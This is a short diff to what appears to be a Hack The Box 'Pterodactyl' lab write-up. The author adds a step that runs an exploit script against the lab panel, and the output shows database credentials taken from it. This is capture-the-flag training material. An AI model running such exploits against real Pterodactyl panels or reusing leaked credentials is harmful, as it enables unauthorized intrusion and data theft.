@@ -360,4 +360,10 @@ after decrypt it:
 
 **Important:** You **cannot just edit this JSON directly**. The real thing you need to modify is **inside the decrypted `value`**.
 
-i dont think i can do that so i try to r
+i dont think i can do that so i try to run directly exploit
+
+```
+ajdev@rootbox:~/HTB/Pterodactyl$ python3 exploit.py http://panel.pterodactyl.htb
+http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel
+```
+
